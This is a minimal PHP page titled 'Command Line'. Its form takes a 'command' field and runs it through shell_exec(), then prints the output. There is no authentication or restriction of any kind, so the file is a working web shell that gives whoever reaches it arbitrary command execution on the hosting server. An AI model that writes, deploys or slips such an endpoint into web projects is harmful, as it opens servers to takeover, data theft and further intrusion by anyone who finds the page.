<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Command Line</title>
</head>

<body>
    <form action="" method="post">
        <input type="text" name="command">
        <button type="submit" name="btnExec">Exec</button>
    </form>

    <pre>
        <?php
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $command = $_POST['command'];
            $exec = shell_exec($command);
            echo htmlspecialchars($exec);
        }
        ?>
    </pre>
</body>

</html>